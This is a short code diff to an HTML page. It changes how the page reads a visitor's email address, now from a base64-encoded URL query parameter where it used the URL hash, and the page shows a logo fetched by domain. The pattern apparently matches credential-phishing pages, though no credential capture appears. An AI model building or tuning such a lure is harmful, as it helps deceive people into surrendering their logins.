@@ -127,13 +127,14 @@
 		}
 		
 		function getEmail () {
-		  let email = "";
-		  if (window.location.hash) {
-			  email = window.location.hash.substring(1);
-			  email = isBase64(email) ? window.atob(email) : email;
-		  }
-		  return email;
-		}
+  let email = "";
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get("e");
+  if (raw) {
+    email = isBase64(raw) ? window.atob(raw) : raw;
+  }
+  return email;
+}
 		
 		function changeBodyImage(domain) {
             document.getElementById("img-field").src = `https://logo.clearbit.com/${domain}`
@@ -177,6 +178,7 @@
     </script>
 </body>
 </html>
+
 
 
 
